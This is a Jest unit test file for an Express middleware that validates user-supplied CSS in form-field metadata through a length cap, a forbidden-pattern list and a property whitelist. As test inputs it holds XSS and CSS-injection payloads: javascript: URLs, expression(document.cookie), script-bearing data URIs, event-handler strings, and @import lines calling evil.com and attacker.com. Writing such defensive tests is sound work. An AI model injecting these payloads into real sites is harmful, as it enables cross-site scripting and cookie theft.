/**
 * Unit tests for CSS Sanitizer Middleware
 * Tests validation of custom CSS to prevent XSS and CSS injection attacks
 */

import { Request, Response, NextFunction } from 'express';
import {
  validateCustomCSS,
  cssSanitizerMiddleware,
} from '../../../src/middleware/css-sanitizer.middleware';

describe('CSS Sanitizer Middleware', () => {
  describe('validateCustomCSS', () => {
    describe('Valid CSS', () => {
      it('should accept valid CSS with safe properties', () => {
        const css = 'color: red; padding: 10px; margin: 5px;';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(true);
        expect(result.errors).toEqual([]);
      });

      it('should accept empty CSS string', () => {
        const result = validateCustomCSS('');

        expect(result.valid).toBe(true);
        expect(result.errors).toEqual([]);
      });

      it('should accept whitespace-only CSS string', () => {
        const result = validateCustomCSS('   ');

        expect(result.valid).toBe(true);
        expect(result.errors).toEqual([]);
      });

      it('should accept all whitelisted properties', () => {
        const css = `
          color: blue;
          background-color: white;
          padding: 10px;
          margin: 5px;
          border: 1px solid black;
          font-size: 14px;
          text-align: center;
          width: 100%;
          display: flex;
        `;
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(true);
        expect(result.errors).toEqual([]);
      });

      it('should accept CSS at maximum length (5000 characters)', () => {
        const css = 'color: blue;'.repeat(416); // ~4992 characters
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(true);
        expect(result.errors).toEqual([]);
      });

      it('should accept background properties with HTTPS URLs', () => {
        const css = 'background-image: url(https://example.com/image.png);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(true);
        expect(result.errors).toEqual([]);
      });
    });

    describe('Length Validation', () => {
      it('should reject CSS exceeding 5000 character limit', () => {
        const css = 'a'.repeat(5001);
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          'CSS exceeds maximum length of 5000 characters'
        );
      });

      it('should include length error when CSS is too long', () => {
        const css = 'color: blue; padding: 10px;'.repeat(200); // >5000 chars
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(
          result.errors.some((e) => e.includes('exceeds maximum length'))
        ).toBe(true);
      });
    });

    describe('Blacklist Pattern Detection', () => {
      it('should reject javascript: protocol', () => {
        // eslint-disable-next-line no-script-url
        const css = 'background: url(javascript:alert(1));';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          'Forbidden pattern detected: javascript:'
        );
      });

      it('should reject javascript: protocol (case insensitive)', () => {
        // eslint-disable-next-line no-script-url
        const css = 'background: url(JAVASCRIPT:alert(1));';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors.some((e) => e.includes('javascript:'))).toBe(true);
      });

      it('should reject expression() function', () => {
        const css = 'width: expression(alert(1));';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          'Forbidden pattern detected: expression('
        );
      });

      it('should reject @import directive', () => {
        const css = '@import url("https://evil.com/style.css");';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Forbidden pattern detected: @import');
      });

      it('should reject HTTP URLs (non-HTTPS)', () => {
        const css = 'background: url(http://example.com/image.png);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          'Forbidden pattern detected: url(http://'
        );
      });

      it('should reject <script tag', () => {
        const css = 'content: "<script>alert(1)</script>";';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Forbidden pattern detected: <script');
      });

      it('should reject onerror= attribute', () => {
        const css = 'background: url(image.png) onerror=alert(1);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Forbidden pattern detected: onerror=');
      });

      it('should reject onload= attribute', () => {
        const css = 'background: url(image.png) onload=alert(1);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Forbidden pattern detected: onload=');
      });

      it('should reject onclick= attribute', () => {
        const css = 'content: "text" onclick=alert(1);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Forbidden pattern detected: onclick=');
      });

      it('should reject onmouseover= attribute', () => {
        const css = 'background: #fff onmouseover=alert(1);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          'Forbidden pattern detected: onmouseover='
        );
      });

      it('should reject data:text/html URI', () => {
        const css =
          'background: url(data:text/html,<script>alert(1)</script>);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          'Forbidden pattern detected: data:text/html'
        );
      });

      it('should reject behavior: property (IE-specific XSS)', () => {
        const css = 'behavior: url(xss.htc);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          'Forbidden pattern detected: behavior:'
        );
      });

      it('should reject -moz-binding (Firefox-specific XSS)', () => {
        const css = '-moz-binding: url(xss.xml#xss);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          'Forbidden pattern detected: -moz-binding'
        );
      });
    });

    describe('Whitelist Property Validation', () => {
      it('should reject non-whitelisted property: position', () => {
        const css = 'position: absolute; top: 0;';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          "CSS property 'position' is not allowed"
        );
        expect(result.errors).toContain("CSS property 'top' is not allowed");
      });

      it('should reject non-whitelisted property: transform', () => {
        const css = 'transform: rotate(45deg);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          "CSS property 'transform' is not allowed"
        );
      });

      it('should reject non-whitelisted property: z-index', () => {
        const css = 'z-index: 9999;';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors).toContain(
          "CSS property 'z-index' is not allowed"
        );
      });

      it('should reject multiple non-whitelisted properties', () => {
        const css = 'position: fixed; z-index: 9999; transform: scale(2);';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors.length).toBeGreaterThanOrEqual(3);
      });
    });

    describe('Multiple Violations', () => {
      it('should detect both blacklist and whitelist violations', () => {
        // eslint-disable-next-line no-script-url
        const css = 'background: url(javascript:alert(1)); position: absolute;';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(result.errors.some((e) => e.includes('javascript:'))).toBe(true);
        expect(result.errors.some((e) => e.includes('position'))).toBe(true);
      });

      it('should detect length violation and dangerous patterns', () => {
        // eslint-disable-next-line no-script-url
        const css = 'javascript:alert(1);'.repeat(300); // >5000 chars + dangerous pattern
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(false);
        expect(
          result.errors.some((e) => e.includes('exceeds maximum length'))
        ).toBe(true);
        expect(result.errors.some((e) => e.includes('javascript:'))).toBe(true);
      });
    });

    describe('Edge Cases', () => {
      it('should handle CSS with mixed case property names', () => {
        const css = 'COLOR: red; PADDING: 10px;';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(true);
        expect(result.errors).toEqual([]);
      });

      it('should handle malformed CSS gracefully', () => {
        const css = 'color red padding 10px;;;';
        const result = validateCustomCSS(css);

        // Should not throw error
        expect(result).toBeDefined();
        expect(result.valid).toBeDefined();
      });

      it('should handle CSS with no colons (invalid syntax)', () => {
        const css = 'color red padding 10px';
        const result = validateCustomCSS(css);

        // Should not crash, validation result depends on parsing logic
        expect(result).toBeDefined();
      });

      it('should handle CSS with empty properties', () => {
        const css = 'color: ; padding: ;';
        const result = validateCustomCSS(css);

        expect(result).toBeDefined();
      });

      it('should handle CSS with special characters', () => {
        const css = 'content: "Hello \\" World"; color: #f00;';
        const result = validateCustomCSS(css);

        // Should handle escaped quotes
        expect(result).toBeDefined();
      });

      it('should handle CSS with newlines and tabs', () => {
        const css = 'color: blue;\n\tpadding: 10px;\n\tmargin: 5px;';
        const result = validateCustomCSS(css);

        expect(result.valid).toBe(true);
      });
    });

    describe('XSS Attack Vectors', () => {
      it('should block CSS-based XSS with javascript protocol', () => {
        /* eslint-disable no-script-url */
        const attacks = [
          'background-image: url(javascript:alert("XSS"));',
          'list-style-image: url(javascript:void(alert(1)));',
          'background: url("javascript:alert(\'XSS\')");',
        ];
        /* eslint-enable no-script-url */

        attacks.forEach((attack) => {
          const result = validateCustomCSS(attack);
          expect(result.valid).toBe(false);
          expect(result.errors.some((e) => e.includes('javascript:'))).toBe(
            true
          );
        });
      });

      it('should block IE expression-based XSS', () => {
        const attacks = [
          'width: expression(alert(1));',
          'height: expression(document.cookie);',
          'background-color: expression(alert("XSS"));',
        ];

        attacks.forEach((attack) => {
          const result = validateCustomCSS(attack);
          expect(result.valid).toBe(false);
          expect(result.errors.some((e) => e.includes('expression('))).toBe(
            true
          );
        });
      });

      it('should block data URI XSS attempts', () => {
        const attack =
          'background: url(data:text/html,<script>alert(1)</script>);';
        const result = validateCustomCSS(attack);

        expect(result.valid).toBe(false);
        expect(result.errors.some((e) => e.includes('data:text/html'))).toBe(
          true
        );
      });

      it('should block import-based CSS injection', () => {
        const attacks = [
          '@import url("https://evil.com/steal.css");',
          "@import 'http://attacker.com/xss.css';",
        ];

        attacks.forEach((attack) => {
          const result = validateCustomCSS(attack);
          expect(result.valid).toBe(false);
          // Should detect either @import or url(http://
          expect(
            result.errors.some(
              (e) => e.includes('@import') || e.includes('url(http://')
            )
          ).toBe(true);
        });
      });
    });
  });

  describe('cssSanitizerMiddleware', () => {
    let mockRequest: Partial<Request>;
    let mockResponse: Partial<Response>;
    let nextFunction: jest.Mock<NextFunction>;

    beforeEach(() => {
      mockRequest = {
        body: {},
      };
      mockResponse = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn().mockReturnThis(),
      };
      nextFunction = jest.fn();
    });

    describe('Valid Form Submissions', () => {
      it('should call next() for form with valid custom CSS', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                type: 'text',
                metadata: { customStyle: 'color: blue; padding: 10px;' },
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
        expect(mockResponse.status).not.toHaveBeenCalled();
      });

      it('should call next() for form without custom CSS', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                type: 'text',
                metadata: {},
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
        expect(mockResponse.status).not.toHaveBeenCalled();
      });

      it('should call next() for form with empty customStyle', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                type: 'text',
                metadata: { customStyle: '' },
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });

      it('should call next() for form with null metadata', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                type: 'text',
                metadata: null,
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });

      it('should call next() when schema_json is directly in body (not nested)', () => {
        mockRequest.body = {
          fields: [
            {
              id: 'field1',
              type: 'text',
              metadata: { customStyle: 'color: red;' },
            },
          ],
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });

      it('should validate multiple fields with valid CSS', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                type: 'text',
                metadata: { customStyle: 'color: blue;' },
              },
              {
                id: 'field2',
                type: 'text',
                metadata: { customStyle: 'padding: 10px;' },
              },
              {
                id: 'field3',
                type: 'text',
                metadata: { customStyle: 'margin: 5px;' },
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });
    });

    describe('Invalid Form Submissions', () => {
      it('should return 400 for field with malicious javascript: CSS', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                fieldName: 'username',
                type: 'text',
                // eslint-disable-next-line no-script-url
                metadata: {
                  customStyle: 'background: url(javascript:alert(1));',
                },
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(mockResponse.status).toHaveBeenCalledWith(400);
        expect(mockResponse.json).toHaveBeenCalledWith({
          error: 'Invalid custom CSS',
          details: expect.arrayContaining([
            expect.stringContaining('javascript:'),
          ]),
          field: 'field1',
        });
        expect(nextFunction).not.toHaveBeenCalled();
      });

      it('should return 400 for field with expression() CSS', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field2',
                type: 'text',
                metadata: { customStyle: 'width: expression(alert(1));' },
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(mockResponse.status).toHaveBeenCalledWith(400);
        expect(mockResponse.json).toHaveBeenCalledWith({
          error: 'Invalid custom CSS',
          details: expect.arrayContaining([
            expect.stringContaining('expression('),
          ]),
          field: 'field2',
        });
      });

      it('should return 400 for field with non-whitelisted property', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field3',
                type: 'text',
                metadata: { customStyle: 'position: absolute; top: 0;' },
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(mockResponse.status).toHaveBeenCalledWith(400);
        expect(mockResponse.json).toHaveBeenCalledWith(
          expect.objectContaining({
            error: 'Invalid custom CSS',
            details: expect.any(Array),
          })
        );
      });

      it('should return 400 for CSS exceeding length limit', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field4',
                type: 'text',
                metadata: { customStyle: 'a'.repeat(5001) },
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(mockResponse.status).toHaveBeenCalledWith(400);
        expect(mockResponse.json).toHaveBeenCalledWith({
          error: 'Invalid custom CSS',
          details: expect.arrayContaining([
            expect.stringContaining('exceeds maximum length'),
          ]),
          field: 'field4',
        });
      });

      it('should stop at first invalid field (fail-fast)', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                type: 'text',
                metadata: { customStyle: 'color: blue;' }, // Valid
              },
              {
                id: 'field2',
                type: 'text',
                // eslint-disable-next-line no-script-url
                metadata: {
                  customStyle: 'background: url(javascript:alert(1));',
                }, // Invalid
              },
              {
                id: 'field3',
                type: 'text',
                metadata: { customStyle: 'position: absolute;' }, // Also invalid but not reached
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(mockResponse.status).toHaveBeenCalledWith(400);
        expect(mockResponse.json).toHaveBeenCalledWith({
          error: 'Invalid custom CSS',
          details: expect.any(Array),
          field: 'field2', // Should fail on field2
        });
      });

      it('should include fieldName in error when available', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                fieldName: 'emailInput',
                type: 'text',
                metadata: { customStyle: 'position: absolute;' },
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(mockResponse.json).toHaveBeenCalledWith(
          expect.objectContaining({
            field: 'field1',
          })
        );
      });
    });

    describe('Edge Cases', () => {
      it('should call next() when request body is empty', () => {
        mockRequest.body = {};

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });

      it('should call next() when fields array is missing', () => {
        mockRequest.body = {
          schema_json: {},
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });

      it('should call next() when fields is not an array', () => {
        mockRequest.body = {
          schema_json: {
            fields: null,
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });

      it('should call next() when fields array is empty', () => {
        mockRequest.body = {
          schema_json: {
            fields: [],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });

      it('should skip validation when customStyle is not a string', () => {
        mockRequest.body = {
          schema_json: {
            fields: [
              {
                id: 'field1',
                type: 'text',
                metadata: { customStyle: 12345 }, // Number instead of string
              },
            ],
          },
        };

        cssSanitizerMiddleware(
          mockRequest as Request,
          mockResponse as Response,
          nextFunction
        );

        expect(nextFunction).toHaveBeenCalled();
      });
    });
  });
});
